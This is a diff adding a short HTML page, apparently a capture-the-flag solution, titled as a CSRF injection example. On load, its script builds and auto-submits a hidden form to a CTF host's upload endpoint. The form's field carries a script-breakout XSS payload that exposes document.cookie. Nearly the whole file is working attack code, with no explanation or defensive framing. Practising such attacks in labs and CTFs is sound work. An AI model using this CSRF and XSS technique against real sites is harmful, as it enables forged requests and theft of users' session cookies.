@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Injection Example</title>
+    <script>
+        window.onload = function() {
+            // Create a form element
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://ctf.widyasecurity.com/upload'; // Target URL of the form submission
+
+            // Create a hidden input field with the malicious payload
+            var input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'url';
+            input.value = '</script><script>alert(document.cookie)</script>';
+
+            // Append the input field to the form
+            form.appendChild(input);
+
+            // Append the form to the body and submit it
+            document.body.appendChild(form);
+            form.submit();
+        };
+    </script>
+</head>
+<body>
+    <h1>CSRF Injection Example</h1>
+</body>
+</html>
